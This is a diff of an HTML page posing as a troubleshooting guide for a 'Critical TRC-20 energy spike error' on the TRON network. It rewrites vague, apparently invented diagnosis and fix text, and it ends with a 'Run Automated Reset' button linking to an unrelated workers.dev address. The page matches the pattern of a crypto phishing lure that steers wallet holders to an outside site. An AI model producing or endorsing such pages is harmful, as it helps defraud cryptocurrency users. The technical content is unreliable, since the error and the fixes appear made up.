@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0f111a;
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
-        background: #00adb5;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,31 +41,32 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an abnormal increase in energy consumption by a TRC-20 smart contract on the TRON network.</li>
+<li>Users experience a "Critical TRC-20 energy spike error" when attempting to interact with TRC-20 tokens on the TRON network, resulting in failed transactions and significant delays.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to excessive energy usage by a smart contract, often caused by inefficient code, infinite loops, or unexpected contract interactions, leading to a rapid depletion of the contract's energy reserves.</li>
+<li>The error occurs due to an unexpected surge in energy consumption by smart contracts, exceeding the allocated energy limits and causing the TRON Virtual Machine (TVM) to halt contract execution.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following:</li>
-<li>Adjust the contract's energy limits to prevent excessive consumption</li>
-<li>Optimize the contract's code to reduce energy usage</li>
-<li>Implement a retry mechanism with exponential backoff to handle temporary energy spikes</li>
+<li>Increase the energy limit for the specific smart contract to accommodate the increased energy requirements.</li>
+<li>Optimize smart contract code to reduce energy consumption and prevent future spikes.</li>
+<li>Implement a retry mechanism with exponential backoff to handle temporary energy shortages:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span>
-<span class="w">  </span><span class="s1">&#39;1000000&#39;</span>,<span class="w"> </span>//<span class="w"> </span>frozen_balance
-<span class="w">  </span><span class="s1">&#39;3&#39;</span><span class="w"> </span>//<span class="w"> </span>frozen_duration
-<span class="o">)</span><span class="p">;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;contract&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TRLimitContract&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;retryCount&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;backoffFactor&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing a dedicated console for further troubleshooting and contract optimization.</p>
+<p>Consider utilizing an external console for more advanced debugging and logging capabilities.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Familiarity with TRON's smart contract architecture</li>
 <li>Understanding of energy management on the TRON network</li>
-<li>Access to the TRONWeb API for contract interactions</li>
+<li>Access to the TRON Web3 console or a compatible wallet interface</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
